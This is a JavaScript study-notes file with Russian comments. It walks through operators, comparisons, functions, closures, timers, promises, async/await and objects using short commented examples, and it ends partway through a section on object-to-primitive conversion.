// https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Expressions_and_Operators#%D0%91%D0%B8%D1%82%D0%BE%D0%B2%D1%8B%D0%B5_%D0%BF%D0%BE%D1%80%D0%B0%D0%B7%D1%80%D1%8F%D0%B4%D0%BD%D1%8B%D0%B5_%D0%BE%D0%BF%D0%B5%D1%80%D0%B0%D1%82%D0%BE%D1%80%D1%8B
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Operators/Operator_Precedence   приоритеты
// https://learn.javascript.ru/operators

//? Операнд – то, к чему применяется оператор. Например, в умножении 5      2 есть два операнда: левый операнд равен 5, а правый операнд равен 2. Иногда их называют «аргументами» вместо «операндов».
//? Унарным называется оператор, который применяется к одному операнду. Например, оператор унарный минус "-" меняет знак числа на противоположный.
//? Бинарным называется оператор, который применяется к двум операндам. Тот же минус существует и в бинарной форме.
// https://learn.javascript.ru/operators




//? Приоритет операторов
//? Все операторы имею свой приоритет и выполняются в соответствующем порядке
//? Почти все операторы возвращают значение, + - =
/*
let a = 1;
let b = 2;
let c = 3 - (a = b + 1);
alert(a); // 3
alert(c); // 0
*/


//? Декремент и инкремент
//? постфиксная форма сначала вернет старое значение, а затем увеличит переменную, префиксная форма сначала увеличит значение а затем вернет результат.
/*
let a = 0;
let b = a++;   //постфиксная
console.log(a);   //1
console.log(b);   //0

let a = 0;
let b = ++a;   //префиксная
console.log(a);   //1
console.log(b);   //1
*/





//? Сравнение
// https://learn.javascript.ru/comparison
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Equality_comparisons_and_sameness

//? Строки
//? строки сравниваются в "алфавитном"(используется кодировка Unicode, а не настоящий алфавит) порядке посимвольно, а также маленькие буквы считаются больше, чем большие
/*
'a' < 'b'   //true
'a' > 'A'   //true
*/


//? Нестрогое сравнение
//? разные типы приводятся к числу, кроме обьектов, обьекты будут вызывать свои методы преобразования в примитивы
/*
интересный факт, значения ниже равны, потому что привели к числу, и оба false, значит они равны, но если отдельно привести каждое к логическому, то 0 будет false, а '0' будет true и сравнение будет другое.
let a = 0;
let b = '0';
a == b   //true
*/


//? Строгое сравнение
//? оператор строгого сравнения не приводит типы к единому, если один из них не подходит будет сразу возврат false
/*
1 === 1   //true
1 === '1'   //false
*/


//? Object.is
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/is
//? существует специальный метод Object.is, который сравнивает значения примерно как ===, но более надёжен в двух особых ситуациях: работает с NaN, значения 0 и -0 разные
/*
Object.is(NaN, NaN) === true, здесь он хорош
Object.is(0, -0) === false, это редко используется, но технически эти значения разные
*/


//? Сравнение null undefined
/*
null === undefined   //false, эти значения различны, так как различны их типы
null == undefined   //true, эти значения равны друг другу и не равны никаким другим значениям. Это специальное правило языка
*/


//? Сравнение обьектов
//? Обьекты никогда не равны друг другу, если это только не один и тот же обьект, сравниваются ссылки обьектов
//? но при сравнении примитивов с обьектами при нестрогом сравнении, обьекты сначала преобразуются к примитивам своими методами встроенными или же нашими кастомными
/*
let a = {};
a == '[object Object]'
*/





//?================================================================================================================================================
//? /Условное ветвление/тернарный оператор/условия/
// https://learn.javascript.ru/ifelse
/*
false ? 'это правда' : false ? 'это тоже правда' : 'а это ложь'   //а это ложь
*/





//? Логические операторы
// https://learn.javascript.ru/logical-operators
//? && || ! приводят значения к логическому типу


//? || запинается на правде, или возвращает последний ложный вариант.
//? Он работает так: Вычисляет операнды слева направо. Каждый операнд конвертирует в логическое значение. Если результат true, останавливается и возвращает исходное значение этого операнда. Если все операнды являются ложными (false), возвращает последний из них.


//? && запинается на лжи или возвращает последний правдивый вариант, если они все правдивы.
//? Вычисляет операнды слева направо. Каждый операнд преобразует в логическое значение. Если результат false, останавливается и возвращает исходное значение этого операнда. Если все операнды были истинными, возвращается последний.
//? Приоритет И больше чем у ИЛИ


//? ! Приводит к логическому типу и возвращает противоположное
/*
let a = null;
console.log(!a);   //true
*/


//? !! Возвращает логический тип аргумента(приводит к логическому)


//? ?? Оператор объединения с null
// https://learn.javascript.ru/nullish-coalescing-operator
//? ?? вернет первый аргумент, если он не null/undefined, иначе второй. То есть возвращает ОПРЕДЕЛЕННОЕ значение.
//? можно записать последовательность из операторов ??, чтобы получить первое значение из списка, которое не является null/undefined.
//? различие между || и ?? в том, что || возвращает первой ИСТИННОЕ значение, а ?? первое определенное(не null/undefined), то есть если у нас есть значение 0, то ?? вернет его, потому что оно определено, а || его не вернет, потому что оно ложно
/*
let user;
let userCash = a ?? 'anonim';   //присвоится аноним

let a;
let b;
let c = 1;
let d = a ?? b ?? c;   //d == 1
*/
/*
**
***
****
*****/
//?=============================================================================
//? Работают с BigInt
//? В js 64 битовая система, но для работы с битами js преобразует все числа в 32 битную систему
//? если после операции получилось больше чем может вместить 32 битная система js обрезает биты


//? /Побитовое/&/
//? Сравнивает каждый бит и возвращает число результата сравнения
//? если оба бита равны 1 - возвращает на место бита 1, иначе 0
/*
? 7 & 11 === 3

? 0111 === 0+4+2+1 === 7
? 1011 === 8+0+2+1 === 11

? 0011 === 0+0+2+1 === 3 результат побитового и
*/



//? /Побитовое/|/
//? Сравнивает каждый бит и возвращает на место бита 1 если хоть какой то равен 1 иначе 0
/*
? 3 | 2 === 3

? 0011 === 0+0+2+1 === 3
? 0010 === 0+0+2+0 === 2

? 0011 === 0+0+2+1 === 3 результат побитового |
*/



//? /Побитовое исключение/^/
//? Сравнивает биты и возвращет 1 если только один из сравниваемых битов 1 иначе 0
/*
? 3 ^ 2 === 1

? 0011 === 0+0+2+1 === 3
? 0010 === 0+0+2+0 === 2

? 0001 === 0+0+0+1 === 1 результат побитового |
*/



//? /Побитовое не/~/
//? Инвертирует все биты
/*
? ~3 === -4
*/



//? /Сдвиг влево/вправо /<</>>/
//? Сдвигает влево или вправо на количество битов и заполняет 0, если число отрицательное то единицами
/*
? 3 << 2 === 12

? 0011 === 0+0+2+1 === 3

? 1100 === 8+3+0+0 === 12 результат сдвига влево на 2 бита


? 3 >> 2 === 0

? 0011 === 0+0+2+1 === 3

? 0000 === 0+0+0+0 === 0 результат сдвига влево на 2 бита
*/
/*
**
***
****
*****/
//? Опциональная цепочка ?.
// https://learn.javascript.ru/optional-chaining
//? мы можем сначала проверить, если ли свойство у обьекта, и затем продолжить работу, также применимо и к методам
//? если цепочка прервется, то вернется undefined
/*
let a = {};
a.f?.();
a?.['name'];
*/

//? нельзя использовать для присваивания(если есть, то присвоить то то то то, так делать нельзя)

//? можно удалять свойства, если они есть
/*
let a = {};
delete a?.name;
*/










//!================================================================================================================================================
//? /Циклы/
// https://learn.javascript.ru/while-for

//? break используется, чтобы выйти из цикла, если цикл внутри цикла, то break выйдет только из текущего цикла, в котором он был вызван

//? continue используется, чтобы перейти к следующей итерации

//? mark(label) можно повесить на цикл, чтобы обратиться к конкретному циклу и выйти из него
/*
mark: for (let i = 0; i < 5; i++) {
    for (let j = 0; j < 5; j++) {
        if (j === 2) {
            break mark;
        }
        console.log(j);
    }
}
*/


//? for
//? в цикле for можно убрать части цикла(начало, условие, шаг)
/*
let i = 0;
for ( ; i < 5; ) {
    i++;
}
*/


//? Можно в цикле пушить в массив, от которого и идет цикл, цикл будет при каждой итерации брать значение length массива.
/*
let arr = [1, 2, 3];

for (let index = 0; index < arr.length; index++) {
    if (index === 1) {
        arr.push(1, 2, 3);
    }
}
*/











//!================================================================================================================================================
//? /Switch/
// https://learn.javascript.ru/switch

//? выполняет строгое сравнение

//? если по ходу выполнения был заход в case(то есть выполнение условия), то будут все последующие case, если в них не прописан break
/*
let a = 2;
switch (a) {
    case 1:
        console.log(1);
    case 2:
        console.log(2);   //выполнится без break
    case 10:
        console.log(3);   //выполнится без break
}
*/


//? группировка case
/*
switch (a) {
    case 1:
    case 2:
        console.log(1);
}
*/










//!================================================================================================================================================
//? /Functions/Функции/
// https://learn.javascript.ru/arrow-functions
// https://learn.javascript.ru/function-basics
// https://ru.wikipedia.org/wiki/%D0%9E%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C_%D0%B2%D0%B8%D0%B4%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D0%B8#.D0.9B.D0.B5.D0.BA.D1.81.D0.B8.D1.87.D0.B5.D1.81.D0.BA.D0.B8.D0.B5_vs._.D0.B4.D0.B8.D0.BD.D0.B0.D0.BC.D0.B8.D1.87.D0.B5.D1.81.D0.BA.D0.B8.D0.B5_.D0.BE.D0.B1.D0.BB.D0.B0.D1.81.D1.82.D0.B8_.D0.B2.D0.B8.D0.B4.D0.B8.D0.BC.D0.BE.D1.81.D1.82.D0.B8
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Operators/function
// https://ru.wikipedia.org/wiki/%D0%9E%D0%B1%D1%8A%D0%B5%D0%BA%D1%82_%D0%BF%D0%B5%D1%80%D0%B2%D0%BE%D0%B3%D0%BE_%D0%BA%D0%BB%D0%B0%D1%81%D1%81%D0%B0


//? функция это обьект первого класса(может быть возвращена и передана как параметр...)


//? функция имеет полный доступ к внешним переменным, но сначала ищет их внутри себя


//? аргументам функции можно присвоить значения по умолчанию(если их не передать будет undefined у аргумента)
/* function f() return; let a = f();   //undefined*/


//? Function Declaration включает хостинг(всплытие функций), а также в глобальной области записываются в window обьект(в модульном скрипте не запишется). В строгом режиме не всплывают выше блока, в котором объявлены
/* function sayHi() { alert( "Привет" ) } */


//? Function Expression объявляет функцию по ходу выполнения кода
/* let sayHi = function() { alert( "Привет" ) } */


//? arguments - псевдомассив аргументов функции, arguments в строгом режиме не связан с каждым аргументом, если изменить один, другой не изменится
//? но если передать обьект, и в функции либо через arguments.<свойство>, либо просто через обращение к аргументу изменить свойство, мы модифицируем переданный обьект
/*
function f(a) {
    arguments[0] = 1;
    console.log(arguments);   //1
    console.log(a);   //0
}
f(0);
*/





//?================================================================================================================================================
//? /Стрелочные функции/Arrow functions/

//? у стрелочной функции this всегда берет this из родительского лексического окружения. Стрелочной функции нельзя задать контекст через привязку, она будет всегда иметь тот контекст, в котором была создана


//? Они не могут быть выступать в виде функции-конструктора, т.е. не могут быть вызваны через new


//? они не имеют обьект arguments, если функция стрелка определена в обычной функции, то arguments возьмется с родительской


//? если один аргумент, можно опустить скобки, и не писать return если выражение помещается в одну строку
/* let f = a => a*2; */





//?================================================================================================================================================
//? /Рекурсия/
// https://learn.javascript.ru/recursion

//? Когда функция производит вложенный вызов, происходит следующее:
//? Выполнение текущей функции приостанавливается.
//? Контекст выполнения, связанный с ней, запоминается в специальной структуре данных – стеке контекстов выполнения.
//? Выполняются вложенные вызовы, для каждого из которых создаётся свой контекст выполнения.
//? После их завершения старый контекст достаётся из стека, и выполнение внешней функции возобновляется с того места, где она была остановлена.


//? рекурсия хранит в памяти n различных контекстов, что следовательно влияет на производительность





//? Замыкание
//? Замыкание – это функция, которая запоминает свои внешние переменные и может получить к ним доступ. В некоторых языках это невозможно, или функция должна быть написана специальным образом, чтобы получилось замыкание. Но, как было описано выше, в JavaScript, все функции изначально являются замыканиями (есть только одно исключение и это - new Function, при создании функции подобным образом в ее [[Environment]] записывается только глобальная область видимости).
//? То есть, они автоматически запоминают, где были созданы, с помощью скрытого свойства [[Environment]] и все они могут получить доступ к внешним переменным.
//? Когда на собеседовании фронтенд-разработчик получает вопрос: «что такое замыкание?», – правильным ответом будет определение замыкания и объяснения того факта, что все функции в JavaScript являются замыканиями, и, может быть, несколько слов о технических деталях: свойстве [[Environment]] и о том, как работает лексическое окружение.





//?================================================================================================================================================
//? /IIFE/Immediately-Invoked Function Expressions/
// https://learn.javascript.ru/closure#iife

//? Раньше в JS не было лексического окружения на уровне блоков кода, поэтому использовались самовызывающиеся функции


//? IIFE - immediately-invoked function expressions
//? функция, которая объявляются и сразу же сама себя вызывает
/*
(() => {
    console.log(1);
})()
*/





//?================================================================================================================================================
//? /Объект функции/NFE/Named Function Expression/
// https://learn.javascript.ru/function-object

//? Функция это обьект, а значит у нее есть свои методы и свойства

//? свойство - это не переменная, оно не имеет своего лексического окружения, то есть оно всегда относится к этой функции

//? length - показывает сколько параметров принимает функция
/*
function f2(a, b) {};
alert(f2.length);   //2
*/

//? name - имя функции

//? можно также определить пользовательские свойства функции, например счетчик, чтобы узнать сколько раз она вызывалась
/*
function say() {
    say.counter++;
}
say.counter = 0;   //начальное значение
say();
say();
say();
say();
console.log(say.counter);   //4
*/





//? NFE Named Function Expression
//? при function expression можно задать сразу имя переменной и самой функции, в этом есть плюс, когда мы внутри функции хотим отбратиться к ней же. А вот если мы из переменной sayHi удалим значение функции, то внутри, при обращении к sayHi мы получим ошибку, т.к. такая переменная не будет содержать функции(надо обращаться к func внтури функции)
/*
let sayHi = function func(who) {
    if (who) {
        alert(`Hello, ${who}`);
    } else {
        sayHi("Guest");   // Ошибка: sayHi не является функцией
    }
};
let welcome = sayHi;
sayHi = null;
welcome();   // Ошибка, вложенный вызов sayHi больше не работает!
*/





//?================================================================================================================================================
//? /Синтаксис New Function/
// https://learn.javascript.ru/new-function

//? Функцию можно объявлять через оператор new, куда первым аргументом приходят аргументы в виде строки, вторым - тело функции в виде строки
/*
let sum = new Function('a', 'b', 'return a + b');
alert(sum(1, 2)); // 3
*/


//? У такой объявленной функции [[environment]] ссылка будет ссылать на глобальный обьект
/*
function f() {
    let value = 18;
    return new Function('return value');   //это работать не будет, т.к. ссылка есть только на глобальную область видимости
}
console.log(f()());
*/





//?================================================================================================================================================
//? /setTimeout/setInterval/
// https://learn.javascript.ru/settimeout-setinterval


//? Эти функции поставляются окружением в котором воспроизводится JS


//? Принимают в виде параметров функцию, задержку и аргументы, которые надо передать в функцию
//? эти функции возвращают идентификатор таймера, чтобы можно было его обнулить
/*
function f(...args) {
    console.log(...args);
}
let id = setTimeout(f, 2000, 1, 2, 2, 3, 4, 5);
clearTimeout(id);
*/


//? Преимущества рекурсивного setTimeout перед setInterval:
//? Рекурсивный метод ждет сначала выполнения кода внутри функции, а только затем запускает таймер еще раз, т.е. если код ресурсоемкий setTimeout будет более точен во времени, а setInterval будет запускаться независимо от того, был ли выполнен код внутри функции или нет


//? Интервалы лучше всего ВСЕГДА отменять, когда они больше не нужны, потому что внешние переменные, к которым они обращаются, будут в памяти до тех пор, пока работают интервалы!!!. Для производительности лучше всего всегде очищать таймеры


//? setTimeout с нулевой задержкой
//? причины, почему функция отработает не сразу:
//? 1 - браузер сам подставит задержку 10мс
//? 2 - это то, что сначала таймер попадет в событийный цикл, а только потом в стек выполнения функций, поэтому он запустится не прям сразу
/*
setTimeout(() => {
    console.log('timer');
}, 0);
console.log(1);
*/





//?================================================================================================================================================
//? /Decorators/Декораторы/
// https://learn.javascript.ru/call-apply-decorators

//? Принимают в себя функцию и как то модифицируют ее
/*
function delay(f, time) {
    return (...args) => {
        setTimeout(() => {
            f(...args);
        }, time);
    }
}
function f(arg) {
    console.log(arg);
}
let d1000 = delay(f, 1000);
d1000('test');
*/





//?================================================================================================================================================
//? /Привязка/контекста/
// https://learn.javascript.ru/bind
// https://learn.javascript.ru/call-apply

//? В примере ниже мы привязываем контекст конкретно к обьекту и передаваемому аргументу
/*
function askPassword(ok, fail) {
    let password = prompt("Password?", '');
    if (password == "rockstar") ok();
    else fail();
}
let user = {
    name: 'John',

    login(result) {
        alert(this.name + (result ? ' logged in' : ' failed to log in'));
    }
};

askPassword(user.login.bind(user, true), user.login.bind(user, false));
*/


//? call и apply отличаются только синтаксисом, одна функция принимает арументы через запятую, другая массив аргументов, и обе вызывают функцию сразу же с этими аргументами





//?================================================================================================================================================
//? /Каррирование/Curry/
// https://learn.javascript.ru/currying-partials

//? Каррирование функции, это модифицирование функции таким образом, чтобы ее можно было вызывать разным количеством вызовов, делается это для того, чтобы замкнуть определенный нужный нам аргумент, чтобы в дальнейшем не передавать его
/*
function curry(_function) {
    return function curried(...arguments1) {
        if (arguments1.length >= _function.length) {
            return _function.apply(this, arguments1);
        } else {
            return (...arguments2) => {
                return curried.apply(this, arguments1.concat(arguments2));
            }
        }
    }
}

function log(a, b, c) {
    return a + b + c;
}

let one = curry(log);
console.log(one(1, 1, 1));
console.log(one(1)(2)(3));
*/
//? Логика такая, что мы модифицурем функцию, возвращая новую, и если новая функция принимает аргументов столько же, сколько и модифицируемая, то мы просто вызываем ее, если нет, то снова возвращаем функцию и вызываем модифицирующую функцию curried, куда передаем сконкатенированные аргументы.
//? По поводу зачем apply?, в блоке else он нужен для того, чтобы привязать массив arguments1 и постоянно конкатенировать именно с ним, иначе будет происходить конкатенация с внутренним массивом при каждом проваливании в блок кода else, это можно увидеть, поставив консоль лог на массив arguments1 перед if блоком.
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Promises/Промисы/
// https://learn.javascript.ru/promise-basics

//? Промис(обещание), это класс для работы с асинхронными функциями
//? Принимает функцию, в которую прокидывается 2 аргумента resolve, reject, первый можно вызывать, когда все ок, и асинхронная операция завершилась, второй - когда закончилась ошибкой


//? Может вернуть либо успешное значение либо ошибку, сразу вызвать и то и то нельзя



//? Если сделать просто catch, но не закинуть колбэк туда - промис обработан не будет



//? /then/catch/finally/

//? then в цепочке вызовов отработает, когда промис закончится, then принимает 2 аргумента в виде функций, и вызывает первую, когда промис выполнился успешно, второй - когда с ошибкой
//? по сути catch делает тоже самое
/*
promise.then(
    function(result);   //обработает успешное выполнение
    function(error);   //обработает ошибку
);
*/


//? catch обрабатывает выкидываемые ошибки из then или catch выше по коду. Если мы обработали catch и после него идут then цепочи, они будут обрабатываться, т.к. catch ловит ошибку и делает код как бы уже легальным, если мы хотим, чтобы все оставшиеся блоки then не выполнились, то нам нужно вернуть Promise.reject или выкинуть ошибку
//? если пустой catch оставить без колбэка - ошибка не считается пойманной
/*
**
***
****
*****/
//?================================================================================================================================================
//? /Цепочка промисов/
//https://learn.javascript.ru/promise-chaining

//? then создает новый промис, если внутри then в колбеке создать новый промис и вернуть его, то следующий then будет ждать его
//? в примере ниже я создал промис и вызвал resolve через 2 секунды, все это время в then, мой код ждал меня, затем я снова во втором then создал асинхронную функцию и вернул ее из then, и следующий после then выполнится только когда вернется значение из предыдущего
/*
console.log('before promise');
let p = new Promise((resolve, reject) => {
    console.log('start async function');

    setTimeout(() => {
        console.log('async code');
        resolve();
    }, 2000);
});
p
    .then(() => {
        console.log('resolve then');
    })
    .then(() => {
        return new Promise((resolve) => {
            setTimeout(() => {
                console.log('second async function');
                resolve();
            }, 2000);
        })
    })
    .then(() => {
        console.log('sync function after async');
    });
*/


//? В цепочке промисов мы можем выкинуть ошибку в блоке catch, и отработает следующий catch, может быть удобно, если в один промис определенная ошибка, то мы можем перейти к другому catch блоку который для такой ошибки и предназначен


//? Если в промисе выпала ошибка и у нас нет блока catch, то наш скрипт упадет полностью, но также можно отследить такие ошибки через глобальный слушатель 'unhandledrejection', который вешается на window
/*
**
***
****
*****/
//?================================================================================================================================================
//? /Promise API/
// https://learn.javascript.ru/promise-api

//? Promise.all
//? ждет выполнения всех переданных ему в виде массива(или любого перебираемого обьекта) промисов, и только затем вызывается функция then, а как результат у функции then будет массив всех значений промисов переданных, а также они будут в той же последовательности, в которой были переданы


//? если хоть один промис был закончен с ошибкой, то all немедленно завершится и будет вызван блок catch


//? в Promise.all помимо промисов можно также передать обычные значения, которые затем также будут собраны в массив по окончанию
/*
let _1 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('1');
        resolve();
    }, 1000);
});
let _2 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('2');
        resolve();
    }, 2000);
});
let _3 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('3');
        resolve();
    }, 3000);
});

Promise.all([_1, _2, _3])
    .then((res) => {
        console.log(res);   //[undefined, undefined, undefined] потому что наши промисы ничего не возвращали
        console.log('after waiting all promises');
    });




function first() {
    return Promise.resolve();
}

function second() {
    return Promise.resolve();
}


async function test() {
    console.time();
    for (let index = 0; index < 1_000_00; index++) {
        // await Promise.all([
        //     first(),
        //     second(),
        // ]);
        await first();
        await second();
    }
    console.timeEnd();
}
test();

*/
//? Promise.allSettled
//? этот метод делает все тоже самое, что и all, только если один промис был выполнен с ошибкой, то он не упадет, а продолжит работу, затем также соберет все промисы в массив преобразив в обьект каждый из них у которого будет одно поле это value, второе это status(fulfilled, rejected)
/*
let _1 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('1');
        resolve();
    }, 1000);
});
let _2 = new Promise((resolve, reject) => {
    setTimeout(() => {
        console.log('2');
        reject();
    }, 2000);
});
let _3 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('3');
        resolve();
    }, 3000);
});

Promise.allSettled([_1, _2, _3])
    .then((res) => {
        console.log(res);
        console.log('after waiting all promises');
    });
*/

//? В старых браузерах может понадобиться полифилл
//? Логика такая: при передаче промисов методу all, мы проходимся по ним map'ом, и когда он будет выполняться, map наш будет менять насильно в статус выполнен, и уже в обработчике мы будем создавать обьект со значениями
/*
let _1 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('1');
        resolve();
    }, 1000);
});
let _2 = new Promise((resolve, reject) => {
    setTimeout(() => {
        console.log('2');
        reject();
    }, 2000);
});
let _3 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('3');
        resolve();
    }, 3000);
});

Promise.all([_1, _2, _3]
    .map(p => Promise.resolve(p)
        .then(
            (value) => {
                console.log('then in map');
                return { value, status: 'good' }
            },
            (error) => {
                console.log('catch in map');
                return { value: error, status: 'bad' }
            },
        )
    )
).then(res => {
    console.log(res);
});
*/


//? Promise.race
//? Ждет первого готового и запускает then блок, в который прокидывает значения готового промиса
/*
let _1 = new Promise((resolve) => {
    setTimeout(() => {
        console.log('1');
        resolve();
    }, 1000);
});
let _2 = new Promise((resolve, reject) => {
    setTimeout(() => {
        console.log('2');
        reject();
    }, 2000);
});

Promise.race([_1, _2, _3]).then(res => {
    console.log(res);
});
*/


//? Promise.resolve/reject
//? Создает промис насильно с определенным результатом, нужен тогда, когда мы обязательно должны получить промис из определенного выражения
//? Ниже записи идентичны
/*
let promise = new Promise(resolve => resolve('done'));
let promise2 = Promise.resolve('done2');
console.log(promise);
console.log(promise2);
*/
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Async/await/
// https://learn.javascript.ru/async-await

//? Движок будет парсить async await в промисы
//? То есть функция, к которой был применен async будет промисом, после ее вызова можно будет применить цепочку из then
//? В самом теле функции можно использовать оператор await для того, чтобы ждать асинхронные операции в теле функции(получается если у нас в теле функции есть несколько Promisов, то мы можем не писать их через then, а просто поставить перед промисом оператор await, и код внутри функции пойдет дальше только после того, как промис будет выполнен)
/*
async function f() {
    await new Promise((resolve) => {
        setTimeout(() => {
            console.log('async 2000');
            resolve();
        }, 2000)
    });
    console.log('after async operation');
}
f();
*/


//? У такой конструкции обработка ошибок будет через обычный try..catch, либо же мы можем к самой функции, если у нас нет такого обработчки, приенить catch конструкцию, т.к. все равно async преобразует метод в промис
/*
async function f() {}
f().catch((err) => {});
*/


//? Также можно преобразовывать методы классов в асинхронные функции
/*
class A{
    constructor() {}
    async log() {
        console.log('some');
    }
}
*/


//? async по сути преобразует обычную функцию в асинхронную таким способом, что если внутри асинхронной функции нет await то она просто вызвает как будто как Promise.resolve
/*
async function test() {
}

Promise.resolve()
    .then(() => {
            тут можно писать свой код
    });
*/
//? await же добавит неявно then в эту цепочку. В примере ниже получится, что при таком вызове, это преобразуется в Promise.resolve() а await внутри функции будет являться then неявно
/*
async function test() {
    await new Promise(resolve => {
        setTimeout(() => {
            resolve('resolved');
        }, 2000);
    });
}

Promise.resolve()
    тут неявно создается then из await
    .then(() => {
            тут можно писать свой код
    });
*/


//? Ниже можно посмотреть примеры, потыкать что когда выполнится
/*
class Test {

    constructor() {
        this.init();
    }

    init() {
        console.log('init');

        this.functionAsyncDontAwait()
            .then(data => {
                console.log(data);
                // this.function1();
            })
        // .then(() => {
        //     console.log('then 2');
        // })
            .then(data => {
                console.log(data);
                console.log('END');
            });
    }

    functionReturnPromise(): Promise<string> {
        return new Promise(resolve => {
            console.log('create functionReturnPromise');

            setTimeout(() => {
                console.log('resolve functionReturnPromise');

                resolve('functionReturnPromise');
            });
        });
    }

    async functionAwaitPromise(): Promise<void> {
        await new Promise(resolve => {
            console.log('create functionAwaitPromise');

            setTimeout(() => {
                console.log('resolve functionAwaitPromise');

                resolve('functionAwaitPromise');
            }, 2000);
        });
    }

    async functionAsyncDontAwait(): Promise<void> {
        new Promise(resolve => {
            console.log('create functionAsyncDontAwait');

            setTimeout(() => {
                console.log('resolve functionAsyncDontAwait');

                resolve('functionAsyncDontAwait');
            }, 2000);
        });
    }
}
new Test();
*/



//? Пример гонки/Гонка/Race
/*
Данная первая часть работать может не правильно, дело в том, что когда доходим до строчки totalLength += await getPageLength(pageNum), сначала сработает totalLength += и только потом будет вызвана асинхронная функция, результат которой будет сложен с уже полученным значением, а это значит, что если вторая функция в Promise.all будет выполнена быстрее, чем первая, то первая обнулит уже посчитанный результат второй функции
let totalLength = 0;

async function addLengthOfSinglePage(pageNum) {
    totalLength += await getPageLength(pageNum);
}

Promise.all([addLengthOfSinglePage(1), addLengthOfSinglePage(2)]).then(() => {
    console.log('The combined length of both pages is', totalLength);
});

Правильный вариант
Тут мы уже получаем фактическое значение после асинхронности
async function addLengthOfSinglePage(pageNum) {
    const lengthOfThisPage = await getPageLength(pageNum);
    totalLength += lengthOfThisPage;
}
*/
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Objects/обьекты/
// https://learn.javascript.ru/object

//? пустой обьект является true всегда


//? объявляется:
/*
let a = new Object();
let b = {};
*/


//? обращение со свойствами
/*
delete object.name;   //удалить
delete object['long name of key']   //удалить
*/


//? динамическое создание ключей с помощью квадратных скобок
/*
let a = 'name';
let obj = {
    [a]: 'dima',   //создаст свойство с ключом 'name'
}
*/


// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Operators/in
//? in оператор для проверки свойства в обьекте, а также ищет в цепочке прототипов, передается в строке, потому что если передать переменную в виде ключа, то значит название свойства обьекта находится в этой переменной.
//? В большинстве случаев прекрасно сработает сравнение с undefined. Но есть особый случай, когда оно не подходит, и нужно использовать "in". это когда свойство существует, но содержит значение undefined:
/*
let a = {name: 'Alex'};
console.log('name' in a);   //true
*/


// https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Statements/for...in
//? перебор обьектов через forin.  key - ключи, a[key] - значения, проходит только по ПЕРЕЧИСЛЯЕМЫМ элементам, символы не берет
/*
let a = {name: 'dima', age: 22};
for (let key in a) {}
*/


//? свойства в обьекте сортируются в след. порядке: сначала идут целочисленные(это те, которые можно из строки перевести в число и обратно не потеряв смысла), а затем все остальные в порядке добавления
/*
let a = {
    '49',
    '1',
    dima: 'dima',
}
consolt.log(a)   //1, 49, dima
*/





//?================================================================================================================================================
//? /ReferenceType/
// https://learn.javascript.ru/object-methods#vnutrennyaya-realizatsiya-ssylochnyy-tip

//? Что будет, если вызвать методы подобным образом?
/*
let object = {
    hi: 'привет',
    bye: 'пока',
    sayHi() {
        console.log(this.hi);
    },
    sayBye() {
        console.log(this.bye);
    },
}
let result = false;

(result ? object.sayHi : object.sayBye)();

либо можено записать так

let method = object.sayHi;
method();
*/
//? В обоих случаях получится то, что this будет undefined. Происходит это потому, что функция также является обьектом и хранится в куче, по ссылке. При присвоении в переменную или определяя метод динамически в круглых скобках, мы получаем тело функции, но вот this туда никак не попадет, потому что для этого надо сразу вызвать метод. Во время вызова метода движок сам прокидывает this в вызываемый метод.





//?================================================================================================================================================
//? /Сравнение обьектов/
//? 2 обьекта равны только тогда, когда это один и тот же обьект
//? Обьекты никогда не равны друг другу, если это только не один и тот же обьект, сравниваются ссылки обьектов
//? но при сравнении примитивов с обьектами при нестрогом сравнении, обьекты сначала преобразуются к примитивам своими методами встроенными или же нашими кастомными
/*
let a = {};
a == '[object Object]'
*/


//? обьекты копируются по ссылке, то есть если переменной присвоить другой обьект, то обе переменные будут ссылаться и изменять один и тот же обьект





//?================================================================================================================================================
//? /Копирование обьектов/

//? поверхностное копирование, копирует только верхние значения(если свойство будет обьектом, то оно скопируется по ссылке)
//? Object.assign
/*
let o1 = {
    a: 1,
}
let o2 = {
    d: 4,
}
let obj = Object.assign({}, o1, o2);
obj.a = 10;
*/





//? глубокое копирование
//? forin, логика такая, что мы перебираем обьект и присваиваем новое значение в другой обьект
/*
function cloneDeep(newObject, objectToBeCloned) {
    for (let key in objectToBeCloned) {
        if (typeof objectToBeCloned[key] !== 'object') {
            newObject[key] = objectToBeCloned[key];
        } else {
            newObject[key] = {};
            cloneDeep(newObject[key], objectToBeCloned[key]);
        }
    }
}
*/


//? JSON.parse JSON.stringify/JSON.parse(JSON.stringify)
/*
let obj = {
    name: 'Dima',
    age: 22,
    secondObj: {
        one: 1,
        two: 2,
    },
};
let newObj = JSON.parse(JSON.stringify(obj));
obj.secondObj.one = 'изменил';
console.log(obj);
console.log(newObj);
*/





//?================================================================================================================================================
//? /Преобразование обьектов/
// https://learn.javascript.ru/object-toprimitive

//? по дефолту обьект преобразуется в [object Object] если со строкой складывают, в NaN если с числом и он всегда равен true


//? все методы по преобразования должны возвращать примитивное значение и только!


//? Алгоритм преобразований к примитивам следующий:
//? Сначала вызывается метод obj[Symbol.toPrimitive](hint), если он существует.
//? Иначе, если хинт равен "string" происходит попытка вызвать obj.toString(), затем obj.valueOf(), смотря что есть.
//? Иначе, если хинт равен "number" или "default" происходит попытка вызвать obj.valueOf(), затем obj.toString(), смотря что есть.





//? Symbol.toPrimitive
//? метод, если есть, определяет все преобразования обьекта, можно самому решать, во что он будет преобразовываться
//? обьект преобразуется в число, например если он приводится явно к числу, в этом методе будет hint number
//? к строке, если например будет alert, т.к. там только строковый тип данных используется, hint будет string
//? default, если будет конкатенация
/*
let a = {
    name: 'dima',
